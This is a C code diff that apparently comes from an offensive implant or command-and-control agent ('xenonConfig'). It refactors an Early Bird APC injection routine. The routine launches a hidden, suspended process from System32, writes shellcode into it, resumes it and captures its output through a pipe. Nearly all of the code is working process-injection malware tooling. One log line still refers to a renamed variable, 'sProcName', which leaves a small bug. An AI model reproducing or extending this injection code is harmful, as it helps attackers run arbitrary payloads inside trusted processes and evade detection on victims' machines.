@@ -8,7 +8,7 @@
 /*
     Helper Functions
 */
-BOOL CreateTemporaryProcess(LPCSTR lpPath, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread, HANDLE* hTmpOutRead)
+BOOL CreateTemporaryProcess(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread, HANDLE* hTmpOutRead)
 {
 	SECURITY_ATTRIBUTES saAttr = { 0 };
 	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
@@ -21,7 +21,7 @@ BOOL CreateTemporaryProcess(LPCSTR lpPath, DWORD* dwProcessId, HANDLE* hProcess,
 	// Create an anonymous pipe
 	if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &saAttr, 0)) {
 		_dbg("CreatePipe failed.\n");
-		return 1;
+		return FALSE;
 	}
 
 	// Prevent child from inheriting the read handle
@@ -42,6 +42,17 @@ BOOL CreateTemporaryProcess(LPCSTR lpPath, DWORD* dwProcessId, HANDLE* hProcess,
 	// Hide Window
 	Si.dwFlags |= STARTF_USESHOWWINDOW;
 	Si.wShowWindow = SW_HIDE;
+
+	/* Create full path of target process */
+	CHAR lpPath   [MAX_PATH * 2];
+	CHAR WnDr     [MAX_PATH];
+
+	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
+		_dbg("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
+	
+	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
 
 	_dbg("\t[i] Running Suspended Process: \"%s\" ... \n", lpPath);
 
@@ -73,7 +84,7 @@ BOOL CreateTemporaryProcess(LPCSTR lpPath, DWORD* dwProcessId, HANDLE* hProcess,
 	*hTmpOutRead = hStdOutRead;		// Anon pipe
 
 	// Doing a check to verify we got everything we need
-	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
+	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL && *hTmpOutRead != NULL)
 		return TRUE;
 
 	return FALSE;
@@ -118,22 +129,22 @@ BOOL RunViaRemoteApcInjection(IN HANDLE hThread, IN HANDLE hProc, IN PBYTE pPayl
 */
 BOOL InjectProcessViaEarlyBird(_In_ PBYTE buf, _In_ SIZE_T szShellcodeLen, _Out_ PCHAR* outData)
 {
-	LPCSTR sProcName = xenonConfig->spawnto;						// Full path to process
-	DWORD dwProcId = NULL;
-	HANDLE hProcess = NULL;
-	HANDLE hThread = NULL;
-	HANDLE hStdOutRead = NULL;		// Read stdout through anon pipe
+	LPCSTR lpProcessName 	= xenonConfig->spawnto;						// Name of process in C:\\Windows\\System32
+	DWORD dwProcId 			= NULL;
+	HANDLE hProcess 		= NULL;
+	HANDLE hThread 			= NULL;
+	HANDLE hStdOutRead 		= NULL;		// Read stdout through anon pipe
 
 	_dbg("[i] Creating \"%s\" as a suspended process. \n", sProcName);
-	if (!CreateTemporaryProcess(sProcName, &dwProcId, &hProcess, &hThread, &hStdOutRead)) {
+	if (!CreateTemporaryProcess(lpProcessName, &dwProcId, &hProcess, &hThread, &hStdOutRead)) {
 		_dbg("Failed to create debugged process : %d\n", GetLastError());
-		return 1;
+		return FALSE;
 	}
 
 	_dbg("[i] Writing shellcode to target process\n");
 	if (!RunViaRemoteApcInjection(hThread, hProcess, buf, szShellcodeLen)) {
 		_dbg("Failed to RunViaRemoteApcInjection : %d\n", GetLastError());
-		return 1;
+		return FALSE;
 	}
 
 	ResumeThread(hThread);
@@ -147,7 +158,7 @@ BOOL InjectProcessViaEarlyBird(_In_ PBYTE buf, _In_ SIZE_T szShellcodeLen, _Out_
 	char* outputBuffer = (char*)malloc(chunkSize);
 	if (!outputBuffer) {
 		_dbg("Memory allocation failed.\n");
-		return 1;
+		return FALSE;
 	}
 
 	while (TRUE) {
